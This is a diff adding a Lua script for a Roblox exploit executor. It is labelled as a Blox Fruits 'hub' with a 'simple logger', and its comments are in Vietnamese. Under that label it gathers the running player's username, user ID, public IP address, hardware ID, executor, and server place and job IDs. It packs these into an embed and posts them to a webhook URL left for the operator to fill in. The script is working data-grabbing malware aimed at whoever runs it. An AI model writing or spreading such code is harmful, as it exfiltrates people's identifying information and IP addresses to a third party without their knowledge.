@@ -1,0 +1,107 @@
+--================= SIMPLE LOGGER (FIXED) =================
+-- Hoạt động trên hầu hết executor
+-- Bỏ qua lỗi readfile/writefile, HTTP request nếu không hỗ trợ
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+print("SKID HUB KAITUN BLOX FRUITS")
+
+--================= THÔNG TIN =================
+local EXECUTOR = identifyexecutor and identifyexecutor() or "Unknown"
+local HWID = gethwid and gethwid() or "Unknown"
+local PLACE_ID = game.PlaceId
+local JOB_ID = game.JobId
+
+--================= WEBHOOK (thay trực tiếp, không mã hóa) =================
+local WEBHOOK_URL = ""  -- thay URL thật
+
+--================= ĐẾM SỐ LẦN EXECUTE (nếu có thể) =================
+local ExecutionCount = "?"
+local function updateCount()
+    if type(readfile) == "function" and type(writefile) == "function" then
+        local ok, data = pcall(readfile, "exec_count.txt")
+        local count = 1
+        if ok and data then
+            count = tonumber(data) or 0
+            count = count + 1
+        end
+        pcall(writefile, "exec_count.txt", tostring(count))
+        ExecutionCount = tostring(count)
+    else
+        ExecutionCount = "N/A (no file access)"
+    end
+end
+pcall(updateCount)
+print("Đã Execute script được: ", ExecutionCount)
+
+--================= LẤY IP (nếu hỗ trợ HTTP) =================
+local PublicIP = "Unknown"
+local function getIP()
+    local requestFunc = http_request or request or (syn and syn.request) or (http and http.request)
+    if requestFunc then
+        local success, resp = pcall(function()
+            return requestFunc({ Url = "https://api.ipify.org", Method = "GET" })
+        end)
+        if success and resp and resp.Body then
+            PublicIP = resp.Body
+        end
+    end
+end
+pcall(getIP)
+print("Script make by skid")
+
+--================= TẠO EMBED =================
+local Embed = {
+    title = "📡 Roblox Account Info",
+    url = "https://www.roblox.com/users/" .. LocalPlayer.UserId,
+    description = "**Display Name:** " .. LocalPlayer.DisplayName,
+    color = 0x5865F2,
+    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+    thumbnail = {
+        url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=420&height=420&format=png"
+    },
+    fields = {
+        { name = "👤 User Name", value = "`" .. LocalPlayer.Name .. "`", inline = true },
+        { name = "🆔 User ID", value = "`" .. LocalPlayer.UserId .. "`", inline = true },
+        { name = "🌐 IP Address", value = "`" .. PublicIP .. "`", inline = true },
+        { name = "⚙️ Executor", value = "`" .. EXECUTOR .. "`", inline = true },
+        { name = "🖥️ HWID", value = "`" .. HWID .. "`", inline = true },
+        { name = "🏠 Place ID", value = "`" .. PLACE_ID .. "`", inline = true },
+        { name = "🔄 Job ID", value = "`" .. JOB_ID .. "`", inline = true },
+        { name = "🔁 Executions", value = "`" .. ExecutionCount .. "`", inline = true },
+        {
+            name = "🚀 Server Hop",
+            value = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. PLACE_ID .. ", '" .. JOB_ID .. "', game.Players.LocalPlayer)\n```",
+            inline = false
+        }
+    },
+    footer = { text = "Skid Logger • " .. os.date("%H:%M:%S") }
+}
+
+--================= GỬI WEBHOOK =================
+local function send()
+    local requestFunc = http_request or request or (syn and syn.request) or (http and http.request)
+    if not requestFunc then
+        warn("Nooooooooooooo")
+        return
+    end
+    local success, err = pcall(function()
+        requestFunc({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode({ embeds = { Embed } })
+        })
+    end)
+    if success then
+        print("Chạy Thành Công !")
+    else
+        warn("Memaybeo : " .. tostring(err))
+    end
+end
+
+-- Chạy gửi sau 1 giây để đảm bảo mọi thứ load
+task.wait(1)
+send()
